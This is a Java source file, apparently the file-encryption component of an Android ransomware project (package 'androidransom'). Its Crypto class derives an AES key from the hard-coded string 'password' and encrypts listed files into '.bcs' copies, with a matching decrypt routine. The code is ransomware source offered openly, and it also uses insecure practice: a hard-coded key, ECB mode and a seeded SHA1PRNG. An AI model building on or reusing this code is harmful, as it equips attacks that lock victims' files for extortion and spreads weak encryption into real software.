package bycracks.androidransom;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.security.SecureRandom;
import java.util.ArrayList;

import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.CipherOutputStream;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;

/**
 * Created by ByeongCheol on 2017-06-25.
 */

public class Crypto {

    static SecretKeySpec skeySpec = null;

    public Crypto() throws Exception {
        if (skeySpec == null)
            skeySpec = generateKey("password");
    }


    /**
     * 암호화관련 함수
     */
    public SecretKeySpec generateKey(String pw) throws Exception {
        byte[] keyStart = pw.getBytes("UTF-8");

        KeyGenerator kgen = KeyGenerator.getInstance("AES");
        SecureRandom sr = SecureRandom.getInstance("SHA1PRNG", "Crypto");
        sr.setSeed(keyStart);
        kgen.init(128, sr);
        SecretKey skey = kgen.generateKey();

        return new SecretKeySpec(skey.getEncoded(),"AES");
    }

    public void crypto(ArrayList<File> fileList, boolean decrypt) throws Exception {
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");

        for (File inFile : fileList) {
            int idx1 = inFile.getPath().lastIndexOf("/");
            int idx2 = inFile.getName().lastIndexOf(".");
            FileInputStream fis = new FileInputStream(inFile);

            byte[] buf = new byte[8];
            int bytesRead;

            if (decrypt) {
                FileOutputStream fos = new FileOutputStream(inFile.getPath().substring(0,idx1)+"/decrypt/"+inFile.getName().substring(0,idx2));

                cipher.init(Cipher.DECRYPT_MODE, skeySpec);
                CipherInputStream cis = new CipherInputStream(fis, cipher);     // decrypt

                while ((bytesRead = cis.read(buf)) != -1)
                    fos.write(buf, 0, bytesRead);
                fos.flush();
                fos.close();
                cis.close();

            } else {
                FileOutputStream fos = new FileOutputStream(inFile+".bcs");

                cipher.init(Cipher.ENCRYPT_MODE, skeySpec);
                CipherOutputStream cos = new CipherOutputStream(fos, cipher);   // encrypt

                while ((bytesRead = fis.read(buf)) != -1)
                    cos.write(buf, 0, bytesRead);
                cos.flush();
                cos.close();
                fos.close();

            }
            fis.close();
        }


        /*
        for (File inFile: fileList) {
            BufferedInputStream bis = new BufferedInputStream(new FileInputStream(inFile));
            BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(inFile));

            byte[] buf = new byte[cipher.getOutputSize((int) inFile.length())];
            int r;

            while ( (r = bis.read(buf)) != -1) {
               bos.write(buf);
            }



        }
        */
    }

}